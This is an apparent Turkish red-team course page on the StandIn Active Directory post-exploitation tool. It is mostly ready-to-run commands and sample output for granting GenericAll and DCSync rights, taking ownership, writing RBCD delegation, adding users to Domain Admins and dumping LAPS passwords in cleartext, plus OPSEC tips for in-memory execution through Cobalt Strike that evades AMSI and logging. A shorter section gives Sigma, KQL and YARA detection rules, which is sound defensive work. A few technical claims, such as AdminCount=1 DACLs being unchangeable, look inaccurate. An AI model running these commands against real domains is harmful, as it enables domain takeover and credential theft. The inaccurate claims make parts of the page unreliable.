# StandIn

> **Kategori:** [9. ACL, GPO VE NESNE MANİPÜLASYONU (OBJECT, ACL & DELEGATION ABUSE)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Rubén Boonen (@FuzzySec) tarafından geliştirilen; Windows sistemlerinde C# (.NET) ile sıfırdan yazılmış, RSAT veya PowerShell gerektirmeden doğrudan .NET Dizin Hizmetleri (`System.DirectoryServices`) API'leri üzerinden çalışan, Active Directory nesnelerinde DACL/SACL manipülasyonu, sahiplik değişimi, grup yönetimi, RBCD ve LAPS parola hasadı yapan C2 uyumlu sömürü aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde uç noktalarda (workstation/jump-host) komut çalıştırma aşamasına gelindiğinde, geleneksel PowerShell tabanlı araçlar (PowerView, ActiveDirectory modülü) modern uç nokta koruma sistemleri (EDR), AMSI (Antimalware Scan Interface) ve PowerShell Script Block Logging (Event ID 4104) tarafından yüksek oranda tespit edilir. Benzer şekilde `bloodyAD` gibi harici Python araçları Linux ortamında mükemmel çalışsa da, Windows içinde çalışan bir Cobalt Strike veya Sliver Beacon ajanı üzerinden harici Python çalıştırmak operasyonel olarak neredeyse imkansızdır.

**`StandIn`**, bu engelleri aşmak amacıyla geliştirilmiş yerel bir C# (.NET) aracıdır. Windows üzerinde çalışan bir C2 oturumunda `execute-assembly` yöntemiyle **tamamen bellekte (In-Memory)** çalıştırılmak üzere optimize edilmiştir:
- Hiçbir PowerShell betiğine veya RSAT ikilisine ihtiyaç duymaz.
- Doğrudan .NET Framework'ün yerleşik `System.DirectoryServices.Protocols` (S.DS.P) ve `ActiveDirectorySecurity` sınıflarını kullanır.
- Active Directory nesnelerinin Erişim Denetim Listelerini (DACL) manipüle eder, nesne sahipliğini devralır, gruplara kullanıcı ekler, RBCD delegasyonunu yapılandırır ve izinli olduğu durumlarda LAPS parolalarını açık metin olarak çeker.

### Temel Yetenekleri ve Modüler Mimarisi

1. **DACL ve ACE Enjeksiyonu (`--set-acl`):**
   - Hedef nesne (Kullanıcı, Bilgisayar, Grup veya OU) üzerinde belirtilen hesaba `GenericAll` (Tam Denetim), `WriteDacl`, `WriteOwner`, `ResetPassword` veya `AllExtendedRights` erişim denetim girdisi (ACE) ekler.
2. **Sahiplik Ele Geçirme (`--set-owner`):**
   - Nesnenin `OwnerSID` değerini doğrudan saldırganın kontrolündeki kullanıcıya atayarak nesne üzerinde tam denetim kurmanın önünü açar (`WriteOwner` sömürüsü).
3. **Kaynak Tabanlı Kısıtlı Yetki Devri (`--set-rbcd`):**
   - Hedef sunucunun `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine aracı bilgisayar hesabının SID değerini yazar.
4. **DCSync Replikasyon Yetkisi Tanımlama (`--set-dcsync`):**
   - Etki alanı kök nesnesi (`DC=corp,DC=local`) üzerinde kullanıcıya `DS-Replication-Get-Changes` ve `DS-Replication-Get-Changes-All` haklarını tanımlar.
5. **LAPS Parola Hasadı (`--laps`):**
   - Dizin içinde okunabilir durumdaki `ms-Mcs-AdmPwd` (Microsoft Local Administrator Password Solution) özniteliklerini toplu olarak sorgular ve yerel yönetici parolalarını listeler.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   HEDEF UÇ NOKTA (C2 BEACON / C# IN-MEMORY)           │
│                                                                        │
│  [ execute-assembly StandIn.exe --object da_user --principal jdoe      │
│                                --set-acl GenericAll ]                  │
│         │                                                              │
│         ├── (1) Bellekte .NET Yansımalı (Reflective) Yükleme Yapılır   │
│         │   └── Sıfır Disk I/O, AMSI Kancalarını Atlatan Yapı         │
│         │                                                              │
│         ├── (2) System.DirectoryServices ile LDAP/LDAPS Bağlantısı:    │
│         │       Target: dc01.corp.local (TCP 389/636)                  │
│         │                                                              │
│         ├── (3) Raw Security Descriptor (ActiveDirectorySecurity)      │
│         │       İnşa Edilir ve ActiveDirectoryAccessRule Eklenir       │
│         │                                                              │
│         ├── (4) LDAP CommitChanges() Çağrısı ile NTDS.dit Güncellenir  │
│         │                                                              │
│         ▼                                                              │
│  [ DOMAIN CONTROLLER (DACL GÜNCELLENDİ) ]                              │
│         │                                                              │
│         ▼                                                              │
│  [ ÇIKTI: jdoe kullanıcısına da_user üzerinde GenericAll Tanımlandı! ] │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Senaryo | PowerView (PowerShell) | StandIn (C# .NET) |
|---|---|---|
| **EDR ve AMSI Radarı** | Script Block Logging ve AMSI tarafından anında loglanır ve engellenir. | Derlenmiş .NET montajı (Assembly) olarak bellekte çalışır; AMSI'den kaçınır. |
| **C2 Entegrasyonu** | `powershell.exe` sürecini spawn etmek zorunda kalır (Gürültülü). | Cobalt Strike / Sliver üzerinden `execute-assembly` ile sıfır süreç iziyle çalışır. |
| **Bağımlılık Durumu** | ActiveDirectory modülü veya harici script gerektirir. | Tek parça bağımsız ikili; Windows'un yerleşik .NET runtime'ı üzerinde çalışır. |
| **Hız ve Stabilite** | PowerShell nesne yönetimi büyük ağlarda yavaşlayabilir. | Saf LDAP protokolüyle çalıştığı için milisaniyeler içinde sonuç döner. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | StandIn | bloodyAD | PowerView | dsacls CLI |
|---|---|---|---|---|
| **Geliştirme Dili** | C# (.NET) | Python 3 | PowerShell | C++ (Native EXE) |
| **Çalışma Platformu** | Windows (Yerel / In-Memory) | Linux / macOS / Windows | Windows (PowerShell) | Windows (Yerleşik LOLBin) |
| **C2 Execute-Assembly** | 🟢 Kusursuz | 🔴 Desteklemez | 🔴 Desteklemez | 🔴 Desteklemez |
| **DCSync Yetkilendirme** | 🟢 Var (`--set-dcsync`) | 🟢 Var (`add dcsync`) | 🟢 `Add-DomainObjectAcl` | 🔴 Desteklemez |
| **LAPS Parola Okuma** | 🟢 Var (`--laps`) | 🟡 Manuel LDAP sorgusu | 🟢 `Get-DomainComputer` | 🔴 Desteklemez |
| **RBCD Enjeksiyonu** | 🟢 Var (`--set-rbcd`) | 🟢 Var (`add rbcd`) | 🟡 Manuel Hex SD | 🔴 Desteklemez |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

StandIn, komut satırı bayrakları aracılığıyla hedef nesneyi, yetkilendirilecek hesabı ve uygulanacak işlemi alır.

### Genel Sözdizimi

```cmd
StandIn.exe --object <HedefNesne> [Eylem Bayrakları] [Bağlantı Seçenekleri]
```

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `--object HEDEF` | İşlem yapılacak hedef kullanıcı, bilgisayar, grup veya OU adı. | `--object "Domain Admins"` |
| `--principal HESAP` | Hedef nesne üzerinde yetkilendirilecek veya gruba eklenecek kullanıcı. | `--principal jdoe` |
| `--set-acl HAK` | Hedef nesneye eklenecek erişim hakkı: `GenericAll`, `WriteDacl`, `WriteOwner`, `ResetPassword`. | `--set-acl GenericAll` |
| `--set-owner` | Hedef nesnenin sahipliğini (`OwnerSID`) `--principal` olarak atar. | `--set-owner` |
| `--set-rbcd` | Hedef bilgisayara RBCD delegasyonu tanımlar (`--principal` bir bilgisayar olmalıdır). | `--set-rbcd` |
| `--remove-rbcd` | Hedef bilgisayardaki RBCD delegasyonunu kaldırır (Temizlik). | `--remove-rbcd` |
| `--set-dcsync` | Etki alanı kökünde `--principal` kullanıcısına DCSync yetkilerini ekler. | `--set-dcsync` |
| `--group-add` | `--principal` kullanıcısını `--object` grubuna üye yapar. | `--group-add` |
| `--group-remove` | `--principal` kullanıcısını `--object` grubundan çıkarır. | `--group-remove` |
| `--laps` | Etki alanında mevcut kullanıcının okuma hakkı olan tüm LAPS parolalarını döker. | `--laps` |
| `--show-acl` | Hedef nesnenin mevcut DACL erişim denetim listesini ayrıntısıyla görüntüler. | `--show-acl` |
| `--domain DOMAIN` | Hedef Active Directory etki alanı adı (FQDN). | `--domain corp.local` |
| `--server DC_FQDN` | Bağlanılacak hedef Domain Controller sunucu adı veya IP adresi. | `--server dc01.corp.local` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Hedef Yönetici Hesabına GenericAll (Tam Denetim) İzni Ekleme

BloodHound üzerinde bir yönetici hesabı (`da_john`) üzerinde `WriteDacl` hakkına sahip olunduğunda, hesaba tam denetim (`GenericAll`) enjekte etmek:

```cmd
StandIn.exe --object da_john --principal jdoe --set-acl GenericAll --domain corp.local
```

**Örnek Konsol Çıktısı Analizi:**

```text
C:\Tools> StandIn.exe --object da_john --principal jdoe --set-acl GenericAll --domain corp.local

   _____ _                  _ _____       
  / ____| |                | |_   _|      
 | (___ | |_ __ _ _ __   __| | | |  _ __  
  \___ \| __/ _` | '_ \ / _` | | | | '_ \ 
  ____) | || (_| | | | | (_| |_| |_| | | |
 |_____/ \__\__,_|_| |_|\__,_|_____|_| |_|
  v1.3 - Active Directory Post-Exploitation Tool

[*] Domain: corp.local
[*] Resolving target object 'da_john'...
[+] Found: CN=da_john,OU=Admins,DC=corp,DC=local
[*] Resolving principal 'jdoe'...
[+] Found: CN=jdoe,OU=Users,DC=corp,DC=local (SID: S-1-5-21-3921021948-1209384729-1928374621-1102)

[*] Reading current DACL on target object...
[*] Creating new ActiveDirectoryAccessRule:
    IdentityReference : CORP\jdoe
    ActiveDirectoryRights: GenericAll
    AccessControlType : Allow
    InheritanceType   : All

[*] Appending rule to security descriptor...
[*] Committing changes to Active Directory...
[+] Successfully added 'GenericAll' for 'CORP\jdoe' on 'da_john'!
```

*Çıktı Yorumu:* `da_john` hesabına `GenericAll` hakkı verilmiştir. Artık standart kullanıcı `jdoe`, hedef yöneticinin parolasını dilediği gibi sıfırlayabilir.

### Senaryo 2: Hedef Sunucuya RBCD Delegasyon Hakkı Tanımlama

Hedef dosya sunucusu `FILESRV01$` üzerinde `GenericWrite` yetkisi olduğunda, aracı makine `ATTACKPC$` için RBCD yetkisi yazmak:

```cmd
StandIn.exe --object FILESRV01$ --principal ATTACKPC$ --set-rbcd
```

Bu işlem sonucunda `FILESRV01$` nesnesinin `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine `ATTACKPC$` makinesinin SID'si eklenir; ardından Rubeus veya getST ile sunucu ele geçirilir.

### Senaryo 3: Etki Alanı Kökünde Doğrudan DCSync Yetkisi Tanımlama

Etki alanı kök nesnesi üzerinde `WriteDacl` izni varsa, tek komutla kullanıcıya tüm parola karmalarını kopyalama (DCSync) izni vermek:

```cmd
StandIn.exe --principal jdoe --set-dcsync --domain corp.local
```

Bu komut, etki alanı nesnesine `DS-Replication-Get-Changes` (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) ve `DS-Replication-Get-Changes-All` (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) haklarını ekler.

### Senaryo 4: Kullanıcıyı Domain Admins Grubuna Ekleme ve Operasyon Sonrası Çıkarma

Yetkili bir grup üzerinde `AddMember` hakkı bulunduğunda:

```cmd
# 1. Kullanıcıyı Domain Admins grubuna ekle
StandIn.exe --object "Domain Admins" --principal jdoe --group-add

# [Operasyonel Görevler Yürütülür]

# 2. Test tamamlandığında kullanıcıyı gruptan çıkar (Temizlik)
StandIn.exe --object "Domain Admins" --principal jdoe --group-remove
```

### Senaryo 5: Etki Alanındaki LAPS Parolalarını Toplu Çekme

Kullanıcının okuma hakkına sahip olduğu tüm sunucuların yerel yönetici (Administrator) parolalarını açık metin listelemek:

```cmd
StandIn.exe --laps --domain corp.local
```

**Örnek Konsol Çıktısı:**

```text
[*] Querying computers with ms-Mcs-AdmPwd attribute...
[+] Found 3 computer(s) with readable LAPS passwords:

  ComputerName : SQLSRV01.corp.local
  LAPS Password: k9#Xp!2Lz@1984
  Expiration   : 10/24/2026 12:00:00

  ComputerName : WEBPROD02.corp.local
  LAPS Password: ComplexAdminPass2026!
  Expiration   : 10/28/2026 15:30:00
```

### Senaryo 6: Cobalt Strike / Sliver Bellek İçi Yürütme

Diske hiçbir binary yazmadan doğrudan C2 ajanı üzerinden bellek içi çalıştırma:

```text
beacon> execute-assembly /opt/tools/StandIn.exe --object "Domain Admins" --principal temp_user --group-add
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `UnauthorizedAccessException: Access is denied on CommitChanges()` | Mevcut kullanıcının hedef nesne üzerinde DACL düzenleme (`WriteDacl`) veya sahiplik (`WriteOwner`) izni bulunmamaktadır. | BloodHound üzerindeki izin ilişkisi tekrar kontrol edilmeli; yazma hakkı bulunan doğru nesne hedeflenmeli veya önce yetki yükseltilmelidir. |
| `DirectoryServicesCOMException (0x80072030): There is no such object on the server` | `--object` veya `--principal` parametresine verilen hesap adı etki alanında bulunamamıştır veya yazım hatası vardır. | Hesabın tam `sAMAccountName` veya Distinguished Name (DN) değeri doğrulanmalı; bilgisayar hesaplarının sonuna `$` eklendiğinden emin olunmalıdır. |
| `AdminCount=1 Protected Object Restriction` | Hedef nesne korumalı bir gruptadır (`AdminSDHolder` tarafından korunmaktadır); miras alınan izinler otomatik kısıtlanmıştır. | `AdminCount=1` olan hesapların DACL'i değiştirilemez. Korumasız hesaplar hedeflenmeli veya doğrudan `AdminSDHolder` nesnesinin ACL'i manipüle edilmelidir. |
| `ms-Mcs-AdmPwd attribute returned null / LAPS not found` | Hedef bilgisayarlarda LAPS kurulu değildir, parolası henüz üretilmemiştir veya mevcut kullanıcının özniteliği okuma hakkı (Read) yoktur. | Bilgisayarların LAPS kullanıp kullanmadığı kontrol edilmeli; alternatif yerel kimlik hasat yöntemlerine (SAM dökümü / DPAPI) yönelinmelidir. |
| `LdapException: The server cannot handle directory requests` | Domain Controller üzerinde LDAP imzalama zorunludur veya SSL/TLS bağlantısı beklenmektedir. | `--server` parametresine IP yerine DC'nin tam FQDN adı verilmeli ve yerel makine sertifika güveni doğrulanmalıdır. |
| `BadImageFormatException / .NET Runtime Mismatch` | StandIn .NET Framework 4.5+ için derlenmiştir ancak kurban makinede yalnızca eski .NET 3.5 yüklüdür. | Hedef işletim sisteminin .NET sürümü doğrulanmalı; gerekirse aracın kaynak kodu uygun .NET hedef sürümüyle yeniden derlenmelidir. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Portları ]     : 🟢 MİNİMAL (Yalnızca LDAP TCP 389 veya 636)     │
│  [ Dosya Sistemi ]   : 🟢 SIFIR (execute-assembly ile in-memory)      │
│  [ DC Günlükleri ]   : 🔴 YÜKSEK (Event 5136 DACL & Event 4728 Grup)  │
│  [ AMSI Radarı ]     : 🟢 SIFIR (PowerShell kullanılmaz, C# derlemesi) │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Domain Controller Dizin Değişiklik Günlükleri (Security Log):**
   - **Event ID 5136 (Directory Service Object Modified):**
     - DACL modifikasyonunda: `AttributeLDAPDisplayName: nTSecurityDescriptor`
     - RBCD enjeksiyonunda: `AttributeLDAPDisplayName: msDS-AllowedToActOnBehalfOfOtherIdentity`
     - Değişikliği yapan kullanıcı adı ve hedef nesne loglara kaydedilir.
   - **Event ID 4728 / 4732 / 4756:** Güvenlik gruplarına üye eklendiğinde (`--group-add`) oluşur.
2. **Uç Nokta Sysmon Günlükleri:**
   - **Event ID 7 (ImageLoad):** Sürecin `System.DirectoryServices.dll` veya `System.DirectoryServices.Protocols.dll` kütüphanelerini belleğe yüklemesi.
   - **Event ID 10 (ProcessAccess):** C2 Beacon sürecinin `execute-assembly` sırasında geçici bir alt süreç (fork-and-run / sacrificial process) başlatması.

### 5.2 Ağ ve EDR İmzaları

- **LDAP Paket İmzaları:** `.NET System.DirectoryServices` kütüphanesinin LDAP istek paketlerindeki ASN.1 başlıkları standart Windows istemcileriyle birebir aynıdır; ağ seviyesinde ayırt edilmesi zordur.
- **Sıfır PowerShell İzi:** PowerShell çalıştırılmadığı için `ScriptBlockLogging` (Event 4104) veya `ModuleLogging` (Event 4103) logları tamamen sessiz kalır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1098** | Account Manipulation | Hedef nesne DACL'lerinin ve sahipliğin değiştirilmesi. |
| **T1098.001** | Additional Cloud/Domain Roles | Ayrıcalıklı güvenlik gruplarına üye eklenmesi. |
| **T1558.002** | Kerberos Ticket Granting Service: S4U Abuse | RBCD delegasyonunun yapılandırılması. |
| **T1003.006** | OS Credential Dumping: DCSync | Etki alanı köküne replikasyon izinleri enjekte edilmesi. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Kalıcı Grup Üyeliği** | İşlem biter bitmez `--group-remove` komutu çalıştırılarak eklenen kullanıcı gruptan derhal çıkarılmalıdır. |
| **DCSync İzni Kirliliği** | `--set-dcsync` ile eklenen haklar operasyon sonrasında temizlenmelidir; güvenlik denetçileri kök dizindeki ek DCSync izinlerini anında fark eder. |
| **Diske Binary Bırakma** | `StandIn.exe` dosyasını asla kurban diske yazmayın; C2 üzerinden `execute-assembly` ile tamamen bellekte yürütün. |
| **Gereksiz LAPS Sorguları** | Tüm etki alanını tarayıp yüzlerce makineden LAPS okumak yerine yalnızca hedeflenen sunucuların şifrelerini tekil sorgulayın. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: StandIn Benzeri C# Araçlarıyla DACL Manipülasyonu Tespiti

```yaml
title: Active Directory Object DACL Modification via DirectoryServices
id: b81249a1-4812-4c20-a912-48910245fe01
status: experimental
description: Detects modifications to sensitive Active Directory object DACLs indicative of StandIn or bloodyAD.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'nTSecurityDescriptor'
  filter_admins:
    SubjectUserName|endswith: '$'
  condition: selection and not filter_admins
falsepositives:
  - Legitimate administrative delegation changes performed by authorized Domain Admins
level: high
tags:
  - attack.privilege_escalation
  - attack.t1098
```

#### Microsoft Sentinel KQL Sorgusu: StandIn ile DCSync İzni Tanımlanması Tespiti

```kql
// Etki alanı kök nesnesine DCSync replikasyon haklarının (DS-Replication-Get-Changes) eklenmesi
SecurityEvent
| where TimeGenerated > ago(2h)
| where EventID == 5136 and ObjectDN !has "OU=" and AttributeLDAPDisplayName == "nTSecurityDescriptor"
| extend EventDataXML = parse_xml(EventData)
| extend AddedValue = tostring(EventDataXML.EventData.Data[6])
| where AddedValue has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" or AddedValue has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
| project TimeGenerated, Computer, SubjectUserName, ObjectDN, AddedValue
```

#### YARA Kuralı: StandIn Derlenmiş .NET Binary ve String Tespiti

```yara
rule PostExploit_StandIn_Assembly {
    meta:
        description = "Detects compiled StandIn .NET assembly and FuzzySec Active Directory manipulation signatures"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "StandIn" ascii wide
        $s2 = "--set-acl" ascii wide
        $s3 = "--set-rbcd" ascii wide
        $s4 = "--set-dcsync" ascii wide
        $s5 = "ActiveDirectoryAccessRule" ascii
        $s6 = "msDS-AllowedToActOnBehalfOfOtherIdentity" ascii wide
    condition:
        uint16(0) == 0x5A4D and (
            3 of ($s1, $s2, $s3, $s4, $s5, $s6)
        )
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Hedef Nesneye GenericAll (Tam Denetim) İzni Ekleme
```cmd
StandIn.exe --object target_user --principal jdoe --set-acl GenericAll
```
- **Ne Yapar?** Hedef kullanıcı veya nesne üzerinde `jdoe` hesabına tam denetim izni verir.
- **Ne Zaman Kullanılır?** Nesne üzerinde `WriteDacl` yetkisi elde edildiğinde tam kontrole geçmek için.
- **Parametreler:** `--object`: Hedef nesne, `--principal`: Yetki verilecek kullanıcı, `--set-acl`: Erişim seviyesi.

### Komut 2: Hedef Sunucuya RBCD Delegasyon Hakkı Yazma
```cmd
StandIn.exe --object FILESRV01$ --principal ATTACKPC$ --set-rbcd
```
- **Ne Yapar?** `FILESRV01$` bilgisayarının `msDS-AllowedToActOnBehalfOfOtherIdentity` alanına `ATTACKPC$` makinesini ekler.
- **Ne Zaman Kullanılır?** Sunucu üzerinde yazma hakkı olduğunda S4U yetki devri başlatmak için.
- **Parametreler:** `--set-rbcd`: Delegasyon tanımlama bayrağı.

### Komut 3: Eklenen RBCD Delegasyonunu Geri Alma (Temizlik)
```cmd
StandIn.exe --object FILESRV01$ --remove-rbcd
```
- **Ne Yapar?** Hedef bilgisayarın delegasyon alanındaki eklenen aracı makineyi temizler.
- **Ne Zaman Kullanılır?** TGS bileti alındıktan hemen sonra nesneyi orijinal haline döndürmek için.
- **Parametreler:** `--remove-rbcd`: Delegasyon silme bayrağı.

### Komut 4: Etki Alanı Kökünde Doğrudan DCSync Yetkisi Tanımlama
```cmd
StandIn.exe --principal jdoe --set-dcsync
```
- **Ne Yapar?** Etki alanı köküne DCSync replikasyon haklarını (`DS-Replication-Get-Changes`) ekler.
- **Ne Zaman Kullanılır?** Etki alanı nesnesinde yazma izni olduğunda anında DCSync yapabilmek için.
- **Parametreler:** `--set-dcsync`: Replikasyon hakkı ekleme.

### Komut 5: Kullanıcıyı Domain Admins Grubuna Ekleme
```cmd
StandIn.exe --object "Domain Admins" --principal jdoe --group-add
```
- **Ne Yapar?** `jdoe` kullanıcısını `Domain Admins` güvenlik grubuna ekler.
- **Ne Zaman Kullanılır?** Grup üzerinde `AddMember` veya `GenericAll` izni olduğunda.
- **Parametreler:** `--group-add`: Üye ekleme eylemi.

### Komut 6: Eklenen Grup Üyeliğini Güvenle Geri Alma
```cmd
StandIn.exe --object "Domain Admins" --principal jdoe --group-remove
```
- **Ne Yapar?** `jdoe` kullanıcısını `Domain Admins` grubundan çıkartır.
- **Ne Zaman Kullanılır?** Sızma testi bittiğinde sistemi temizlemek için.
- **Parametreler:** `--group-remove`: Üye silme eylemi.

### Komut 7: Etki Alanındaki LAPS Parolalarını Toplu Çekme
```cmd
StandIn.exe --laps
```
- **Ne Yapar?** Mevcut kullanıcının okuma yetkisine sahip olduğu tüm sunucuların LAPS parolalarını döker.
- **Ne Zaman Kullanılır?** Sunucuların yerel `Administrator` parolasını elde edip doğrudan oturum açmak için.
- **Parametreler:** `--laps`: LAPS sorgulama modu.

### Komut 8: Hedef Nesne Sahipliğini Ele Geçirme (WriteOwner)
```cmd
StandIn.exe --object target_user --principal jdoe --set-owner
```
- **Ne Yapar?** Hedef nesnenin `OwnerSID` değerini `jdoe` olarak değiştirir.
- **Ne Zaman Kullanılır?** Nesne üzerinde `WriteOwner` hakkı olduğunda tam denetime giden ilk adım olarak.
- **Parametreler:** `--set-owner`: Sahiplik atama.

### Komut 9: Hedef Nesnenin Mevcut DACL İzinlerini Görüntüleme
```cmd
StandIn.exe --object "Domain Admins" --show-acl
```
- **Ne Yapar?** Hedef nesne üzerindeki tüm Access Control Entry (ACE) kayıtlarını ayrıntısıyla listeler.
- **Ne Zaman Kullanılır?** Nesne üzerindeki mevcut hakları ve kimlerin erişebildiğini incelemek için.
- **Parametreler:** `--show-acl`: İzin listeleme modu.

### Komut 10: Belirli Bir Domain Controller Hedefleme
```cmd
StandIn.exe --object target_user --principal jdoe --set-acl GenericAll --server dc02.corp.local
```
- **Ne Yapar?** İşlemleri doğrudan belirtilen ikincil Domain Controller üzerinden yürütür.
- **Ne Zaman Kullanılır?** Birincil DC izlendiğinde veya ağ erişimi kısıtlı olduğunda.
- **Parametreler:** `--server`: Hedef DC FQDN'i.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [FuzzySecurity / StandIn](https://github.com/FuzzySecurity/StandIn)
- **FuzzySecurity Araştırma Blogu:** [Active Directory DACL Exploitation](https://fuzzysecurity.com/)
- **Microsoft Dokümantasyonu:** [System.DirectoryServices.ActiveDirectorySecurity Class](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurity)
- **MITRE ATT&CK Referansı:** [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/)

---

> **Önceki:** [← impacket-addcomputer](./impacket-addcomputer.md) · **Sonraki:** [dsacls →](./dsacls.md)
